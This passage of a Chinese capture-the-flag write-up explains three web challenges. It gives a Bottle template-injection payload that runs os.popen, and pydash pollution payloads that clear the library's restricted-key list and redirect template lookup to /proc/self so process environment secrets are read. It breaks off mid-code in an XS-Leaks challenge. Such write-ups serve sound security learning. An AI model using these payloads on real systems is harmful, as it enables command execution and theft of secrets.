+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=% eval(&quot;__import__(&#x27;os&#x27;)&quot;+chr(46)+&quot;popen(&#x27;id&gt;2&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
+<p>发现居然渲染的时候写入同一个文件渲染的时候还是上次的结果，只能写进新文件了：</p>
+<img src="/posts/32411/7.png" class title="awa">
+<p>通过<code>cat *</code>能够读到requirements.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bottle==0.13.2</span><br><span class="line">pydash==8.0.5</span><br></pre></td></tr></table></figure>
+<p>注意pydash版本不是之前的漏洞版本，而是最新版，这就是下面的伏笔了）</p>
+<h1><span id="ez_dash_revenge"> ez_dash_revenge</span></h1>
+<p>修复了<code>&lt;%</code>导致的问题：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;render&quot;</span></span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+<p>因此要想获得flag，就只能往<code>bottle.template</code>下手了，跟进bottle.template函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get a rendered template as a string iterator.</span></span><br><span class="line"><span class="string">    You can use a name, a filename or a template string as first parameter.</span></span><br><span class="line"><span class="string">    Template rendering arguments can be passed as dictionaries</span></span><br><span class="line"><span class="string">    or directly (as keyword arguments).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tpl = args[<span class="number">0</span>] <span class="keyword">if</span> args <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args[<span class="number">1</span>:]:</span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">    adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">    lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH) <span class="comment">#去到TEMPLATE_PATH去寻找</span></span><br><span class="line">    tplid = (<span class="built_in">id</span>(lookup), tpl)</span><br><span class="line">    <span class="keyword">if</span> tplid <span class="keyword">not</span> <span class="keyword">in</span> TEMPLATES <span class="keyword">or</span> DEBUG:</span><br><span class="line">        settings = kwargs.pop(<span class="string">&#x27;template_settings&#x27;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            <span class="keyword">if</span> settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TEMPLATES[tplid]:</span><br><span class="line">        abort(<span class="number">500</span>, <span class="string">&#x27;Template (%s) not found&#x27;</span> % tpl)</span><br><span class="line">    <span class="keyword">return</span> TEMPLATES[tplid].render(kwargs)</span><br></pre></td></tr></table></figure>
+<p>可以发现如果<code>tpl</code>如果含有<code>\n、&#123;、%、$</code>的能够加入<code>TEMPLATES[tplid]</code>，后续能够直接渲染它，否则会将其作为模板的名字，尝试寻找对应的模板文件渲染，而<code>tpl</code>是我们传入的第一个参数</p>
+<p>它会根据<code>TEMPLATE_PATH</code>里去找到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATE_PATH = [<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./views/&#x27;</span>]</span><br><span class="line">TEMPLATES = &#123;&#125;</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">NORUN = <span class="literal">False</span>  <span class="comment"># If set, run() does nothing. Used by load_app()</span></span><br></pre></td></tr></table></figure>
+<p>接下来通过跟进lookup能够发现基类<code>BaseTemplate</code>中定义了搜索模板文件的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">cls, name, lookup=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; Search name in all directories specified in lookup.</span></span><br><span class="line"><span class="string">        First without, then with common extensions. Return first hit. &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> lookup:</span><br><span class="line">            <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Empty template lookup path.&quot;</span>, <span class="string">&quot;Configure a template lookup path.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.isabs(name):</span><br><span class="line">            <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Use of absolute path for template name.&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;Refer to templates with names or paths relative to the lookup path.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> spath <span class="keyword">in</span> lookup:</span><br><span class="line">            spath = os.path.abspath(spath) + os.sep</span><br><span class="line">            fname = os.path.abspath(os.path.join(spath, name))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> fname.startswith(spath): <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(fname): <span class="keyword">return</span> fname</span><br><span class="line">            <span class="keyword">for</span> ext <span class="keyword">in</span> cls.extensions:</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)</span><br></pre></td></tr></table></figure>
+<p>它会去搜索<code>TEMPLATE_PATH</code>下的文件(应该)，理论上只需要污染<code>TEMPLATE_PATH</code>就能够做到任意文件读</p>
+<p>但是上文说过pydash的版本是<code>8.0.5</code>，因此不能够直接通过<code>__globals__</code>去获得bottle，在<code>pydash 5.1.2</code>版本中能够使用<code>__globals__</code>，但是高版本下已经被修复了，现在会报<code>access to restricted key __globals__</code></p>
+<p>因此我们要想办法绕过<code>restricted key</code></p>
+<p>可以发现该异常只有输入在<code>RESTRICTED_KEYS</code>中的内容时才会触发：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pydash.helpper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>而<code>RESTRICTED_KEYS</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESTRICTED_KEYS = (<span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>理论上可以通过pydash自己污染掉<code>RESTRICTED_KEYS</code>从而使用globals：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>污染成功后再污染<code>TEMPLATE_PATH</code>即可：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;/proc/self&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>最后再渲染envrion即可：</p>
+<img src="/posts/32411/8.png" class>
+<img src="/posts/32411/9.png" class>
+<img src="/posts/32411/10.png" class>
+<h1><span id="internal_api"> internal_api</span></h1>
+<p>题目给出hint：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 注意 search 路由查询成功和失败 (Ok 和 Err) 时返回的 HTTP 状态码</span><br><span class="line">hint</span><br><span class="line">2. XSLeaks</span><br></pre></td></tr></table></figure>
+<p>附件是一个rust写的search api，通过网页端测试的docker可以发现普通用户查询的时候数据库通过<code>/search</code>路由查询，而flag存在了数据库当中：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;fs, path::Path&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> r2d2::&#123;Pool, PooledConnection&#125;;</span><br><span class="line"><span class="keyword">use</span> r2d2_sqlite::SqliteConnectionManager;</span><br><span class="line"><span class="keyword">use</span> rusqlite::params;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">type</span> <span class="title class_">DbPool</span> = Pool&lt;SqliteConnectionManager&gt;;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">type</span> <span class="title class_">DbConn</span> = PooledConnection&lt;SqliteConnectionManager&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">init</span>(db_name: <span class="type">String</span>, json_name: <span class="type">String</span>, flag: <span class="type">String</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;DbPool&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> Path::<span class="title function_ invoke__">new</span>(&amp;db_name).<span class="title function_ invoke__">exists</span>() &#123;</span><br><span class="line">        fs::<span class="title function_ invoke__">remove_file</span>(&amp;db_name)?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = SqliteConnectionManager::<span class="title function_ invoke__">file</span>(db_name);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = Pool::<span class="title function_ invoke__">new</span>(manager)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">content</span> = fs::<span class="title function_ invoke__">read_to_string</span>(json_name)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span>: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt; = serde_json::<span class="title function_ invoke__">from_str</span>(&amp;content)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;CREATE TABLE comments(content TEXT, hidden BOOLEAN)&quot;</span>,</span><br><span class="line">        params![],</span><br><span class="line">    )?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">comment</span> <span class="keyword">in</span> comments &#123;</span><br><span class="line">        conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">            <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">            params![comment, <span class="literal">false</span>],</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">        params![flag, <span class="literal">true</span>],</span><br><span class="line">    )?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(pool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">search</span>(conn: DbConn, query: <span class="type">String</span>, hidden: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stmt</span> =</span><br><span class="line">        conn.<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = stmt</span><br><span class="line">        .<span class="title function_ invoke__">query_map</span>(params![<span class="built_in">format!</span>(<span class="string">&quot;%&#123;&#125;%&quot;</span>, query), hidden], |row| &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>)?)</span><br><span class="line">        &#125;)?</span><br><span class="line">        .collect::&lt;rusqlite::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;&gt;()?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(comments)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>普通的评论的hidden是false，而flag是true，通过查询的<code>/search</code>路由查询的hidden硬编码为了false</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">app</span> = Router::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">get</span>(route::index))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/report&quot;</span>, <span class="title function_ invoke__">post</span>(route::report))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::public_search))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/internal/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::private_search))</span><br><span class="line">        .<span class="title function_ invoke__">with_state</span>(Arc::<span class="title function_ invoke__">new</span>(pool));</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">public_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = pool.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">false</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">private_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">    <span class="title function_ invoke__">ConnectInfo</span>(addr): ConnectInfo&lt;SocketAddr&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="comment">// 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 本地环境 (docker compose)</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bot_ip</span> = tokio::net::<span class="title function_ invoke__">lookup_host</span>(<span class="string">&quot;bot:4444&quot;</span>).<span class="keyword">await</span>?.<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> addr.<span class="title function_ invoke__">ip</span>() != bot_ip.<span class="title function_ invoke__">ip</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ 